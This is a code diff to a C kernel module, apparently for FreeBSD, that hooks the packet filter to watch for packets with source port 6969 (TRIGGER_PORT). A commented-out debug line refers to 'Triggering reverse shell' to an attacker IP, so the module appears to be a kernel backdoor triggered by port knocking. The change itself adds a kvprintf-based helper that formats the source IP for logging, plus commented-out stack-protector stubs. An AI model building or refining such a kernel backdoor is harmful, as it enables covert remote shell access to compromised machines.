@@ -19,7 +19,62 @@
 #include <net/if.h>
 #include <sys/syslog.h>
 
-// replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
+
+// // Define stack protection so we can use snprintf
+
+// // Define the stack protector guard
+// uintptr_t __stack_chk_guard = 0xDEADBEEFCAFEBABE;
+
+// // Define the stack protection failure handler
+// void __stack_chk_fail(void) {
+//     panic("Kernel stack smashing detected!");
+// }
+
+
+
+
+
+#define INET_ADDRSTRLEN 16  // Ensure buffer is large enough
+
+// Buffer structure to hold the formatted string
+struct kvprintf_buf {
+    char *buf;
+    size_t len;
+    size_t pos;
+};
+
+// Callback function for kvprintf() that writes to the buffer
+static void kvprintf_buf_writer(int c, void *arg) {
+    struct kvprintf_buf *kvb = (struct kvprintf_buf *)arg;
+    
+    // Ensure we don't exceed buffer size (leave space for null terminator)
+    if (kvb->pos < kvb->len - 1) {
+        kvb->buf[kvb->pos++] = (char)c;
+    }
+}
+
+// Function to format an IP address using kvprintf()
+void format_ip_using_kvprintf(char *buffer, size_t size, struct in_addr ip) {
+    struct kvprintf_buf kvb = { buffer, size, 0 };
+
+    kvprintf("%d.%d.%d.%d", kvprintf_buf_writer, &kvb, 10, 
+             (ip.s_addr >> 24) & 0xFF,
+             (ip.s_addr >> 16) & 0xFF,
+             (ip.s_addr >> 8) & 0xFF,
+             (ip.s_addr) & 0xFF);
+
+    // Null-terminate the string
+    buffer[kvb.pos] = '\0';
+}
+
+
+
+
+
+
+
+
+// Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
 
 /*
@@ -93,14 +148,23 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
 
 
-        char ip_str[INET_ADDRSTRLEN];  // Buffer for IP string
-        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
-                 (ip_header->ip_src.s_addr >> 24) & 0xFF,
-                 (ip_header->ip_src.s_addr >> 16) & 0xFF,
-                 (ip_header->ip_src.s_addr >> 8) & 0xFF,
-                 (ip_header->ip_src.s_addr) & 0xFF);
+        // char ip_str[INET_ADDRSTRLEN];  // Buffer for IP string
+        // snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
+        //          (ip_header->ip_src.s_addr >> 24) & 0xFF,
+        //          (ip_header->ip_src.s_addr >> 16) & 0xFF,
+        //          (ip_header->ip_src.s_addr >> 8) & 0xFF,
+        //          (ip_header->ip_src.s_addr) & 0xFF);
         
-        printf("Kernel IP Address: %s\n", ip_str);
+        // printf("Kernel IP Address: %s\n", ip_str);
+
+
+
+        struct in_addr src_ip = ip_header->ip_src;
+        char ip_str[INET_ADDRSTRLEN];
+
+        format_ip_using_kvprintf(ip_str, sizeof(ip_str), src_ip);
+    
+        printf("Formatted Source IP: %s\n", ip_str);  // Kernel-safe logging
 
     printf("Packet with source port 6969 detected!!\n");
     return PFIL_PASS;
